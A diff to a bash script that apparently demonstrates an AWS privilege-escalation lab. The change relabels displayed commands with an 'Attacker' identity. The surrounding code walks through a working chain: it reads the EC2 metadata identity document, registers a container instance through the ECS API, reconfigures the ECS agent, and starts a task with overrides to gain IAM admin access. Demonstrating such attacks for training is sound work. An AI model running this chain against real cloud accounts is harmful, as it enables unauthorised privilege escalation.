@@ -31,12 +31,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command (commands run on the EC2)
 show_attack_cmd() {
-    echo -e "\n${CYAN}[EC2]\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -247,7 +249,7 @@ echo ""
 echo -e "${YELLOW}Step 3: Verifying identity on the compromised EC2${NC}"
 echo "Running sts:GetCallerIdentity on the EC2 instance..."
 
-show_attack_cmd "aws sts get-caller-identity"
+show_attack_cmd "Attacker" "aws sts get-caller-identity"
 ssm_exec "aws sts get-caller-identity --output json"
 
 if [ $SSM_EXIT_CODE -eq 0 ]; then
@@ -265,7 +267,7 @@ echo ""
 echo -e "${YELLOW}Step 4: Verifying instance role does NOT have admin permissions yet${NC}"
 echo "Attempting to list IAM users from EC2 (should fail)..."
 
-show_attack_cmd "aws iam list-users --max-items 1"
+show_attack_cmd "Attacker" "aws iam list-users --max-items 1"
 ssm_exec "aws iam list-users --max-items 1 2>&1 || true"
 
 if echo "$SSM_OUTPUT" | grep -q "AccessDenied\|is not authorized"; then
@@ -283,7 +285,7 @@ echo -e "${BLUE}The EC2 instance exists but its ECS agent points to a non-existe
 echo -e "${BLUE}The attacker will call ecs:RegisterContainerInstance directly via the API.${NC}"
 
 # Check from the admin context (instance role doesn't have ListContainerInstances)
-show_cmd "aws ecs list-container-instances --cluster $ECS_CLUSTER_NAME"
+show_cmd "Attacker" "aws ecs list-container-instances --cluster $ECS_CLUSTER_NAME"
 CONTAINER_INSTANCES=$(aws ecs list-container-instances \
     --region "$AWS_REGION" \
     --cluster "$ECS_CLUSTER_NAME" \
@@ -330,9 +332,9 @@ REGEOF
 REGISTER_SCRIPT="${REGISTER_SCRIPT//__REGION__/$AWS_REGION}"
 REGISTER_SCRIPT="${REGISTER_SCRIPT//__CLUSTER__/$ECS_CLUSTER_NAME}"
 
-show_attack_cmd "curl -s http://169.254.169.254/latest/dynamic/instance-identity/document"
-show_attack_cmd "curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature"
-show_attack_cmd "aws ecs register-container-instance --cluster $ECS_CLUSTER_NAME --instance-identity-document \$IDENTITY_DOC --instance-identity-document-signature \$IDENTITY_SIG --total-resources '[...]'"
+show_attack_cmd "Attacker" "curl -s http://169.254.169.254/latest/dynamic/instance-identity/document"
+show_attack_cmd "Attacker" "curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature"
+show_attack_cmd "Attacker" "aws ecs register-container-instance --cluster $ECS_CLUSTER_NAME --instance-identity-document \$IDENTITY_DOC --instance-identity-document-signature \$IDENTITY_SIG --total-resources '[...]'"
 
 # Base64 encode script and send to EC2 (avoids quoting issues with SSM parameters JSON)
 REGISTER_B64=$(echo "$REGISTER_SCRIPT" | base64 | tr -d '\n')
@@ -366,7 +368,7 @@ echo ""
 
 RECONFIG_CMD="sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && systemctl restart ecs && echo 'ECS agent reconfigured and restarted'"
 
-show_attack_cmd "sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && systemctl restart ecs"
+show_attack_cmd "Attacker" "sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && systemctl restart ecs"
 
 ssm_exec "$RECONFIG_CMD"
 
@@ -446,7 +448,7 @@ echo "Agent Container Instance ARN: $CONTAINER_INSTANCE_ARN"
 # Deregister the orphaned direct-API registration if it's different from the agent's
 if [ "$DIRECT_API_CI_ARN" != "$CONTAINER_INSTANCE_ARN" ] && [ -n "$DIRECT_API_CI_ARN" ]; then
     echo "Deregistering orphaned direct-API container instance..."
-    show_attack_cmd "aws ecs deregister-container-instance --cluster $ECS_CLUSTER_NAME --container-instance $DIRECT_API_CI_ARN"
+    show_attack_cmd "Attacker" "aws ecs deregister-container-instance --cluster $ECS_CLUSTER_NAME --container-instance $DIRECT_API_CI_ARN"
     ssm_exec "aws ecs deregister-container-instance --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --container-instance $DIRECT_API_CI_ARN --force 2>&1 || true"
     echo -e "${GREEN}✓ Cleaned up orphaned registration${NC}"
 fi
@@ -456,7 +458,7 @@ echo ""
 echo -e "${YELLOW}Step 9: Discovering existing task definitions${NC}"
 echo "Listing task definitions from EC2..."
 
-show_attack_cmd "aws ecs list-task-definitions --family-prefix $EXISTING_TASK_FAMILY --region $AWS_REGION"
+show_attack_cmd "Attacker" "aws ecs list-task-definitions --family-prefix $EXISTING_TASK_FAMILY --region $AWS_REGION"
 ssm_exec "aws ecs list-task-definitions --family-prefix $EXISTING_TASK_FAMILY --region $AWS_REGION --query 'taskDefinitionArns' --output json"
 
 if [ $SSM_EXIT_CODE -eq 0 ]; then
@@ -499,7 +501,7 @@ if [ $SSM_EXIT_CODE -ne 0 ]; then
 fi
 
 # Step 10b: Run start-task with overrides from file
-show_attack_cmd "aws ecs start-task --cluster $ECS_CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --container-instances $CONTAINER_INSTANCE_ARN --overrides file:///tmp/overrides.json"
+show_attack_cmd "Attacker" "aws ecs start-task --cluster $ECS_CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --container-instances $CONTAINER_INSTANCE_ARN --overrides file:///tmp/overrides.json"
 
 START_TASK_CMD="aws ecs start-task --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --container-instances $CONTAINER_INSTANCE_ARN --overrides file:///tmp/overrides.json --query [tasks[0].taskArn,failures[0].reason] --output text"
 
@@ -587,7 +589,7 @@ echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"
 echo -e "${YELLOW}Step 13: Verifying administrator access from EC2${NC}"
 echo "Attempting to list IAM users from EC2 using instance role..."
 
-show_attack_cmd "aws iam list-users --max-items 3"
+show_attack_cmd "Attacker" "aws iam list-users --max-items 3"
 ssm_exec "aws iam list-users --max-items 3 --output table"
 
 if [ $SSM_EXIT_CODE -eq 0 ]; then
